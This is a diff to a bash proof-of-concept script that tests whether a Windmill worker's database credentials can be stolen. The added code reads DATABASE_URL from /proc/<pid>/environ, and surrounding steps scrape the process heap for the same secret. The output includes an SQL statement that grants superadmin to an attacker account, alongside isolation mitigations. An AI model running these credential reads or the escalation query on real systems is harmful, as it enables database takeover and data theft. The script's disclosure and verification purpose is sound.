@@ -22,9 +22,51 @@ fi
 
 echo "  Found windmill PID: $windmill_pid"
 
+# Attack Vector 1: /proc/environ (MOST RELIABLE - check this FIRST)
+echo ""
+echo "[2/6] Attack Vector 1: Reading /proc/$windmill_pid/environ..."
+if [ -r /proc/$windmill_pid/environ ]; then
+    echo "  ⚠️ Environment file IS readable"
+    extracted=$(cat /proc/$windmill_pid/environ 2>/dev/null | tr '\0' '\n' | grep "^DATABASE_URL=")
+
+    if [ -n "$extracted" ]; then
+        echo ""
+        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+        echo "❌❌❌ CRITICAL VULNERABILITY ❌❌❌"
+        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+        echo ""
+        echo "DATABASE_URL successfully extracted from /proc/environ:"
+        echo ""
+        echo "$extracted"
+        echo ""
+        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+        echo ""
+        echo "ATTACK IMPACT:"
+        echo "  • Full database credentials exposed"
+        echo "  • Direct PostgreSQL access possible"
+        echo "  • Can escalate to superadmin via:"
+        echo "    UPDATE password SET super_admin=TRUE WHERE username='attacker'"
+        echo "  • Full workspace data access and modification"
+        echo ""
+        echo "EXPLOITATION DIFFICULTY:"
+        echo "  • Skill level: TRIVIAL (cat, tr, grep - standard Linux)"
+        echo "  • Time required: < 1 second"
+        echo "  • Privileges needed: None (same UID as worker)"
+        echo ""
+        echo "MITIGATION:"
+        echo "  ✅ Enable PID namespace isolation (ENABLE_UNSHARE_PID=true)"
+        echo "  ✅ Or use NSJAIL sandboxing"
+        echo ""
+        exit 1
+    fi
+    echo "  DATABASE_URL not found in environ"
+else
+    echo "  ✅ Cannot read /proc/$windmill_pid/environ (protected by PID isolation)"
+fi
+
 # Check if we can read the process memory
 echo ""
-echo "[2/5] Checking memory access permissions..."
+echo "[3/6] Checking memory access permissions..."
 if [ ! -r /proc/$windmill_pid/mem ]; then
     echo "✓ Cannot read process memory"
     echo "  This is GOOD - means proper isolation is in place!"
@@ -37,7 +79,7 @@ echo "  ⚠️ Process memory IS readable"
 
 # Get heap memory region
 echo ""
-echo "[3/5] Identifying heap memory region..."
+echo "[4/6] Identifying heap memory region..."
 heap_info=$(grep '\[heap\]' /proc/$windmill_pid/maps 2>/dev/null | head -1)
 
 if [ -z "$heap_info" ]; then
@@ -52,7 +94,7 @@ echo "  Heap region: $heap_range"
 
 # Attempt extraction
 echo ""
-echo "[4/5] Attempting to extract DATABASE_URL from heap..."
+echo "[5/6] Attempting to extract DATABASE_URL from heap..."
 echo "  (This may take a few seconds...)"
 
 # Method 1: Using dd + strings on heap region (MOST RELIABLE)
@@ -67,7 +109,7 @@ if [ -z "$extracted" ]; then
 fi
 
 echo ""
-echo "[5/5] Extraction results:"
+echo "[6/6] Extraction results:"
 echo ""
 
 if [ -n "$extracted" ]; then
